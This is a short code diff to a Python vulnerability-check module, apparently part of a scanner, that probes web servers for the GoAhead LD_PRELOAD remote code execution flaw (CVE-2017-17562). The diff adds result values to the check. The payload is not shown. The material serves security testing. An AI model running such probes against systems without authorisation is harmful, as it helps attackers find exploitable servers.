@@ -30,11 +30,14 @@ class goahead_LD_PRELOAD_rce_BaseVerify:
             req = requests.post(vulnurl, data=data, headers=headers, timeout=10, verify=False)
             if r"098f6bcd4621d373cade4e832627b4f6" in str(req.headers):
                 cprint("[+]存在GoAhead LD_PRELOAD远程代码执行(CVE-2017-17562)漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "GoAhead LD_PRELOAD远程代码执行(CVE-2017-17562)", str(payload), req.text
             else:
                 cprint("[-]不存在goahead_LD_PRELOAD_rce漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
